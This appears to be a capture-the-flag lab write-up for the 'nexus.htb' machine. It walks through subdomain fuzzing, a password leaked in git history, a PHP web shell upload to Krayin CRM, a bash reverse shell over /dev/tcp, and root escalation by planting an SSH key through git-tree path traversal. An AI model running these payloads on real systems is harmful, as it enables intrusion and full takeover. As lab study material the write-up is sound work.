![](Assets/Pasted%20image%2020260626102213.png)

---

```bash
ping -c 4 10.129.38.252
PING 10.129.38.252 (10.129.38.252) 56(84) bytes of data.
64 bytes from 10.129.38.252: icmp_seq=1 ttl=63 time=88.5 ms
64 bytes from 10.129.38.252: icmp_seq=2 ttl=63 time=81.2 ms
64 bytes from 10.129.38.252: icmp_seq=3 ttl=63 time=102 ms
64 bytes from 10.129.38.252: icmp_seq=4 ttl=63 time=100 ms

--- 10.129.38.252 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
```

## 1. Reconnaissance

We executed a comprehensive port scan with `nmap` to discover exposed services:

```bash
sudo nmap -p- --min-rate 5000 -sS -sV -sC 10.129.38.252
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-26 10:25 -0600
Warning: 10.129.38.252 giving up on port because retransmission cap hit (10).
Nmap scan report for nexus.htb (10.129.38.252)
Host is up (0.083s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Nexus Energy Authority \xE2\x80\x94 Powering the Nation's Future
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The domain `nexus.htb` was added to the local `/etc/hosts` file to allow DNS resolution and access to the web application.
## 2. Initial Access

We can see a normal page, but we can found the email `j.matthew@nexus.htb`.

![](Assets/Pasted%20image%2020260626104723.png)

So leets check the subdomains, with `ffuf` so leets try this command

```bash
ffuf -u http://10.129.38.252 -w subdomains-top1million-110000.txt -H "Host: FUZZ.nexus.htb"
```

We can see this answers, and see the same size `154` so lets modify the command

```bash
ffuf -u http://10.129.38.252 -w subdomains-top1million-110000.txt -H "Host: FUZZ.nexus.htb" -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.38.252
 :: Wordlist         : FUZZ: /home/HollowR00t/Dictionarys/seclist/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.nexus.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 88ms]
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 162ms]
:: Progress: [110000/110000] :: Job [1/1] :: 38 req/sec :: Duration: [0:05:30] :: Errors: 0 ::
```

So we can go first with the domain `git.nexus.htb` and we can found this repositories 

![](Assets/Pasted%20image%2020260626111715.png)
Then we can check the file `.env` and see the username `krayin` and to see the password we can clonne the repositorie to use the command

```bash
git log --oneline
9b817fa (HEAD -> main, origin/main, origin/HEAD) Upload files to "/"
1615c46 Upload files to "/"
```

so lets use the commands

```bash
git show 9b817fa4e0
commit 9b817fa4e073d12fc43952acb09f3067b2f17adf (HEAD -> main, origin/main, origin/HEAD)
Author: admin <admin@nexus.htb>
Date:   Thu Apr 23 18:05:22 2026 +0000

    Upload files to "/"

diff --git a/.env b/.env
index cb7ccc3..5ae1bb2 100644
--- a/.env
+++ b/.env
@@ -2,7 +2,7 @@ APP_NAME='Krayin CRM'
 APP_ENV=local
 APP_KEY=
 APP_DEBUG=true
-APP_URL=http://nexus.htb
+APP_URL=http://billing.nexus.htb
 APP_TIMEZONE=Asia/Kolkata
 APP_LOCALE=en
 APP_CURRENCY=USD
@@ -15,7 +15,7 @@ DB_HOST=krayin-mysql
 DB_PORT=3306
 DB_DATABASE=krayin
 DB_USERNAME=krayin
-DB_PASSWORD=N27xh!!2ucY04
+DB_PASSWORD=
 DB_PREFIX=
 BROADCAST_DRIVER=log
 CACHE_DRIVER=file
```

We can see the passwod `N27xh!!2ucY04` now we can use the credentials and see the dashboard

![](Assets/Pasted%20image%2020260626112646.png)

We can investigate and see that the version of Krayin its 2.2.0, so lets found this **CVE-2026-38526**

Now we can make a email here and add a image in the text file.

![](Assets/Pasted%20image%2020260626140515.png)

So lets modify the peticion in burp suite

```php
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: text/php 

<?php system($_GET['cmd']); ?>
```

## 3. Lateral movements

we need put this to se where is the cmd, if we see in the result a route we can affirme that we have a RCE.

```bash
curl -G "http://billing.nexus.htb/storage/tinymce/b2d36c9e44ac14d9e9053d6020716f92.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ip_vpn/4444 0>&1'"

#Result

nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.38.252 46224
bash: cannot set terminal process group (1468): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nexus:~/krayin/storage/app/public/tinymce$ 
```

Then we can go to a specific route to see the new password

```bash
www-data@nexus:~/krayin$ cat .env
cat .env
APP_NAME="Krayin CRM"
APP_ENV=local
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD

VITE_HOST=
VITE_PORT=

LOG_CHANNEL=stack
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=

BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=laravel@krayincrm.com
MAIL_FROM_NAME="${APP_NAME}"
MAIL_DOMAIN=webkul.com

MAIL_RECEIVER_DRIVER=sendgrid

IMAP_HOST=imap.example.com
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=your_username
IMAP_PASSWORD=your_password

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
www-data@nexus:~/krayin$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:988::/var/log/laurel:/bin/false
jones:x:1000:1000:,,,:/home/jones:/bin/bash
mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

Then we can see 2 thing the new password and a user.

User: `jones`
Password: `y27xb3ha!!74GbR`

So in the scan we can se a port 22, lets try a ssh with the new credentials

```bash
ssh jones@nexus.htb
jones@nexus:~$ whoami
jones
```

## 4. Root Escalation

### Discovering the timer

Using LinPEAS we found a custom systemd timer:

```bash
╔══════════╣ System timers
gitea-template-sync.timer    gitea-template-sync.service
```

Checking the associated service:

```bash
cat /etc/systemd/system/gitea-template-sync.service
```

```ini
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

This script runs **as root** every 60 seconds. Reviewing it:

```bash
cat /etc/gitea/template-sync.py
```

The vulnerable line:

```python
target = os.path.join(stage_path, filepath)
```

`filepath` comes directly from `git ls-tree` output of any repo marked as a Gitea "template" repository, with **no sanitization**. This allows a classic path traversal: if a file inside the template repo has a path like `../../../../../root/.ssh/authorized_keys`, `os.path.join` will happily write outside the intended staging directory — as root.

### Exploitation

**1. Generate an SSH key pair:**

```bash
ssh-keygen -t ed25519 -f /tmp/malicious_key -N ""
```

**2. Create a Gitea API token for `jones`** (requires both `write:repository` and `write:user` scopes — the first attempt with only `write:repository` failed when creating the repo):

```bash
curl -X POST http://localhost:3000/api/v1/users/jones/tokens \
  -H "Content-Type: application/json" \
  -u 'jones:y27xb3ha!!74GbR' \
  -d '{"name":"exploit_token","scopes":["write:repository","write:user"]}'
```

**3. Create a repository and mark it as a template:**

```bash
TOKEN="<sha1_from_above>"

curl -X POST http://localhost:3000/api/v1/user/repos \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"rce","private":false}'

curl -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"template":true}'
```

**4. Build a malicious Git tree using low-level plumbing commands.**

The local filesystem won't allow creating a literal `..` directory (it's reserved by the OS), so the tree must be built manually with `git hash-object` and `git mktree`, nesting `..` entries to traverse upward:

```bash
git config --global user.email "jones@nexus.htb"
git config --global user.name "jones"

# Create the blob containing our public key
BLOB=$(git hash-object -w --stdin <<< "$(cat /tmp/malicious_key.pub)")

# Build tree: authorized_keys file inside a .ssh folder
TREE1=$(printf "100644 blob $BLOB\tauthorized_keys\n" | git mktree)
TREE2=$(printf "040000 tree $TREE1\t.ssh\n" | git mktree)

# IMPORTANT: wrap .ssh inside a "root" folder before adding traversal —
# skipping this step results in writing to ../../../../../.ssh/authorized_keys
# instead of the intended ../../../../../root/.ssh/authorized_keys
TREE_ROOT=$(printf "040000 tree $TREE2\troot\n" | git mktree)

# Wrap with 5 levels of ".." to escape the staging directory
TREE3=$(printf "040000 tree $TREE_ROOT\t..\n" | git mktree)
TREE4=$(printf "040000 tree $TREE3\t..\n" | git mktree)
TREE5=$(printf "040000 tree $TREE4\t..\n" | git mktree)
TREE6=$(printf "040000 tree $TREE5\t..\n" | git mktree)
TREE7=$(printf "040000 tree $TREE6\t..\n" | git mktree)

COMMIT=$(git commit-tree $TREE7 -m "sync")
git update-ref refs/heads/main $COMMIT
```

**5. Push to the remote repository** (embedding the token in the URL avoids interactive auth prompts):

```bash
git remote add origin http://jones:$TOKEN@localhost:3000/jones/rce.git
git push -u origin main --force
```

**6. Wait for the timer and monitor the log:**

```bash
tail -f /var/log/template-sync.log

[2026-06-26 21:XX:XX] Syncing template: jones/rce  
[2026-06-26 21:XX:XX] synced: ../../../../../root/.ssh/authorized_keys  
[2026-06-26 21:XX:XX] Template sync complete
```

**7. SSH as root:** 
```bash 
ssh -i /tmp/malicious_key -o StrictHostKeyChecking=no root@10.129.38.252 
 
root@nexus:~whoami 
root 
```